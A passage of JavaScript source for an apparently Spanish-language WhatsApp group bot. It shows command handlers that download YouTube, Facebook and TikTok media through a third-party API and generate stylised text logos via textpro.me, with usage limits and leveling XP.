📆 Fecha de subida : ${datayt.f_carga}
📺 Canal : ${datayt.canal}
📃 Descripcion : ${datayt.descripcion}
🧬 ID : ${datayt.id}
🌐 Url : ${datayt.url}`,
					"footerText": `${NameBot} 🔥`,
					"buttons": [{
							"buttonId": `${prefix}ytmp3 ${datayt.url}`,
							"buttonText": {
								"displayText": `[ AUDIO MP3 🔊 ]`
							},
							"type": "RESPONSE"
						},
						{
							"buttonId": `${prefix}ytmp4 ${datayt.url}`,
							"buttonText": {
								"displayText": `[ VIDEO MP4 🎞️ ]`
							},
							"type": "RESPONSE"
						}
					],
					"headerType": 6,
					"locationMessage": loc,
					quoted: null
				}, MessageType.buttonsMessage, {
					contextInfo: {
						mentionedJid: [sender]
					}
				})
				addFilter(from)
				await limitAdd(sender)
				addLevelingXp(sender, 450)
				addLevelingLevel(sender, 1)
			}
			break
			case 'ytmp3': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(args[0]) && !args[0].includes('youtu')) return reply('*[ ! ] Link inválido*\n_Por favor, use un link de YouTube_')
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let audimp3 = arg[1]
				try {
					var apiytdl = await fetchJson(`https://latam-api.vercel.app/api/ytmp3_2?apikey=${MyApiKey}&q=${audimp3}`)
					/*var apiytdl2 = await fetchJson(`https://latam-api.vercel.app/api/ytmp3?apikey=${MyApiKey}&q=${audimp3}`)*/
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let thumbapi = await getBuffer(apiytdl.logo)
				let audapi = await getBuffer(apiytdl.descarga)
				/*let thumbapi2 = await getBuffer(apiytdl2.logo)
				let audapi2 = await getBuffer(apiytdl2.descarga)*/
				await teslagod.sendMessage(from, audapi, audio, {
					mimetype: 'audio/mp4',
					filename: `${apiytdl.titulo}.mp3`,
					quoted: fakemek,
					contextInfo: {
						"externalAdReply": {
							"title": `${apiytdl.titulo}`,
							"body": `⇆ㅤㅤ◁ㅤㅤ❚❚ㅤㅤ▷ㅤㅤ↻`,
							"previewType": "PHOTO",
							"thumbnailUrl": ``,
							"thumbnail": thumbapi,
							"sourceUrl": `${apiytdl.descarga}`
						}
					}
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					/*teslagod.sendMessage(from, audapi2, audio, {mimetype: 'audio/mp4', filename: `${apiytdl2.titulo}.mp3`, quoted: fakemek, contextInfo:{"externalAdReply":{"title": `${apiytdl2.titulo}`,"body": `⇆ㅤㅤ◁ㅤㅤ❚❚ㅤㅤ▷ㅤㅤ↻`,"previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": thumbapi2,"sourceUrl": `${apiytdl2.descarga}`}} })*/
				})
				//
				addFilter(from)
				await limitAdd(sender)
				addLevelingXp(sender, 450)
				addLevelingLevel(sender, 1)
			}
			break
			case 'ytmp4': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(args[0]) && !args[0].includes('youtu')) return reply('*[ ! ] Link inválido*\n_Por favor, use un link de YouTube_')
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				try {
					var apiytdl = await fetchJson(`https://latam-api.vercel.app/api/ytmp4_2?apikey=${MyApiKey}&q=${UwU}`)
					/*var apiytdl2 = await fetchJson(`https://latam-api.vercel.app/api/ytmp4?apikey=${MyApiKey}&q=${UwU}`)*/
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let logovid = await getBuffer(apiytdl.logo)
				let vidapi = await getBuffer(apiytdl.descarga)
				/*let logovid2 = await getBuffer(apiytdl2.logo)
				let vidapi2 = await getBuffer(apiytdl2.descarga)*/
				await teslagod.sendMessage(from, vidapi, video, {
					mimetype: 'video/mp4',
					caption: `Titulo: ${apiytdl.titulo}\nTamaño: ${apiytdl.peso} aprox...\nExtencion: .mp4`,
					quoted: fakemek
				}).catch(e => {
					console.log(e)
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					/*teslagod.sendMessage(from, vidapi2, video, {mimetype:  'video/mp4', caption: `Titulo: ${apiytdl2.titulo}\nTamaño: ${apiytdl2.peso} aprox...\nExtencion: .mp4`, quoted: fakemek })*/
				})
				//
				addFilter(from)
				await limitAdd(sender)
				addLevelingXp(sender, 450)
				addLevelingLevel(sender, 1)
			}
			break
			case 'facebook':
			case 'fbdl': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(UwU)) return reply(`*[ ! ] Link inválido*\n_Por favor, use un link de Facebook Watch_\nEjm : ${prefix + command} https://fb.watch/bhndro5Un-/`)
				if (!UwU.includes('fb.watch')) return reply(`*[ ! ] Link inválido*\n_Por favor, use un link de Facebook Watch_\nEjm : ${prefix + command} https://fb.watch/bhndro5Un-/`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var datafb = await fetchJson(`https://latam-api.vercel.app/api/fbdl?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": mylogo
				}
				teslagod.sendMessage(from, {
					"contentText": `✍️ Titulo : ${datafb.titulo}
🌐 Url : ${UwU}
┏━⊱🎥 Calidad : ${datafb.calidad_1}
┗⊱💿 Tamaño : ${datafb.peso_d1}
┏━⊱📽️ Calidad : ${datafb.calidad_2}
┗⊱📀 Tamaño : ${datafb.peso_d2}`,
					"footerText": `${NameBot} 🔥`,
					"buttons": [{
							"buttonId": `${prefix}fbsd ${datafb.descarga_1}`,
							"buttonText": {
								"displayText": "[ VIDEO SD 💿 ]"
							},
							"type": "RESPONSE"
						},
						{
							"buttonId": `${prefix}fbhd ${datafb.descarga_2}`,
							"buttonText": {
								"displayText": "[ VIDEO HD 📀 ]"
							},
							"type": "RESPONSE"
						}
					],
					"headerType": 6,
					"locationMessage": loc,
					quoted: null
				}, MessageType.buttonsMessage, {
					contextInfo: {
						mentionedJid: [sender]
					}
				})

			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'fbsd': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(UwU)) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let fbpisd = await getBuffer(UwU)
				await teslagod.sendMessage(from, fbpisd, video, {
					mimetype: 'video/mp4',
					caption: `[Facebook Video SD 💿]`,
					quoted: fakemek
				}).catch(e => {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			break
			case 'fbhd': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(UwU)) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let fbpihd = await getBuffer(UwU)
				await teslagod.sendMessage(from, fbpihd, video, {
					mimetype: 'video/mp4',
					caption: `[Facebook Video HD 📀]`,
					quoted: fakemek
				}).catch(e => {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			break
			case 'tiktokdl':
			case 'tktkdl': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(UwU)) return reply(`*[ ! ] Link inválido*\n_Por favor, use un link de Tik Tok_\nEjm : ${prefix + command} https://vm.tiktok.com/ZMLr2J6xS/`)
				if (!UwU.includes('vm.tiktok.com')) return reply(`*[ ! ] Link inválido*\n_Por favor, use un link de Tik Tok_\nEjm : ${prefix + command} https://vm.tiktok.com/ZMLr2J6xS/`)
				buscando(`_Buscando resultado, ${pushname} por favor espere..._`)
				try {
					var tkres = await fetchJson(`https://latam-api.vercel.app/api/tiktokdl1?apikey=${MyApiKey}&q=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				loc = {
					"degreesLatitude": 0,
					"degreesLongitude": 0,
					"jpegThumbnail": mylogo
				}
				teslagod.sendMessage(from, {
					"contentText": `✍️ Autor : ${tkres.autor}
#️⃣ Descripcion : ${tkres.descripcion}
🌐 Url : ${UwU}`,
					"footerText": `${NameBot} 🔥`,
					"buttons": [{
						"buttonId": `${prefix}tkmp4 ${tkres.dlvid_1}`,
						"buttonText": {
							"displayText": "[ VIDEO 🎞️ ]"
						},
						"type": "RESPONSE"
					}],
					"headerType": 6,
					"locationMessage": loc,
					quoted: null
				}, MessageType.buttonsMessage, {
					contextInfo: {
						mentionedJid: [sender]
					}
				})

			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'tkmp3': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(UwU)) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let tkapimp3 = await getBuffer(UwU)
				await teslagod.sendMessage(from, tkapimp3, audio, {
					mimetype: 'audio/mp4',
					filename: `${pushname}.mp3`,
					quoted: fakemek,
					contextInfo: {
						"externalAdReply": {
							"title": `Toque aqui para escuchar el audio en linea ✓`,
							"body": `${NameBot} 🔥`,
							"previewType": "PHOTO",
							"thumbnailUrl": ``,
							"thumbnail": mylogo,
							"sourceUrl": `${UwU}`
						}
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			break
			case 'tkmp4': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!UwU) return reply('*[ ! ] Y el Link?*')
				if (!isUrl(UwU)) return
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let tkapimp4 = await getBuffer(UwU)
				await teslagod.sendMessage(from, tkapimp4, video, {
					mimetype: 'video/mp4',
					caption: `[TIK-TOK VIDEO]`,
					quoted: fakemek,
					contextInfo: {
						"externalAdReply": {
							"title": `Toque aqui para ver el video en linea ✓`,
							"body": `${NameBot} 🔥`,
							"previewType": "PHOTO",
							"thumbnailUrl": ``,
							"thumbnail": mylogo,
							"sourceUrl": `${UwU}`
						}
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			break

			///⚡ /Mas comandos/⚡///
			//Menu crealogos
			case 'crealogos': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				let menulogos = `${monospace}[ CREA-LOGOS ]${monospace}
 
╔═══════════
║☞ ${prefix}attp
║☞ ${prefix}halloween
║☞ ${prefix}lava
║☞ ${prefix}toxico
║☞ ${prefix}metalrojo
║☞ ${prefix}tormenta
║☞ ${prefix}gneon
║☞ ${prefix}neontxt
║☞ ${prefix}arcoiris
║☞ ${prefix}hielo
║☞ ${prefix}lapiz
║☞ ${prefix}roca3d
║☞ ${prefix}ficcion
║☞ ${prefix}romper
║☞ ${prefix}sangre
║☞ ${prefix}gameover
║☞ ${prefix}pornhub
╚═══════════
`
				thumbNK(fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), menulogos)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'halloween':
			case 'hallowen':
			case 'haloween':
			case 'halowen': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/halloween-fire-text-effect-940.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'lava':
			case 'laba': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/lava-text-effect-online-914.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'toxico':
			case 'toxic':
			case 'tóxico': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/toxic-text-effect-online-901.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'metalrojo':
			case 'rojometal':
			case 'hotmetal':
			case 'metalhot': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/hot-metal-text-effect-843.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'tormenta':
			case 'thunder': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/create-thunder-text-effect-online-881.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'gneon':
			case 'neong': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/green-neon-text-effect-874.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'neontxt':
			case 'txtneon': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/neon-light-text-effect-online-882.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'arcoiris': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'hielo':
			case 'ice': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/ice-cold-text-effect-862.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'lapiz':
			case 'lápiz':
			case 'lapis': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/create-a-sketch-text-effect-online-1044.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'roca3d':
			case '3droca':
			case 'roka3d':
			case '3droka': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				creando(`_Espere ${pushname}, estoy trabajando en su solicitud..._`)
				let tprolink = "https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html"
				try {
					var TeslApi = await fetchJson(`https://latam-api.vercel.app/api/tpro1?apikey=${MyApiKey}&estilo=${tprolink}&text1=${UwU}`)
				} catch (e) {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					console.log(`Error fetch, comando: ${command}`)
				}
				let apipro = TeslApi.logo.link
				let apiproimg = await getBuffer(apipro)
				enviarIMG(apiproimg, fs.readFileSync('./multimedia/imagenes/CreartHD.jpg'), `
*┏━❪CREA-LOGOS❫━*
*┃*
*┣ Diseño* : _${command}_
*┃*
*┣ Texto* : _${UwU}_
*┃*
*┣ Autor* : _${pushname}_
*┃*
*┣ Fecha de Creación* : _${fechaCompleta}_
*┃*
*┗❪ TextPro ❫━*`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'ficcion': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isDiversion) return
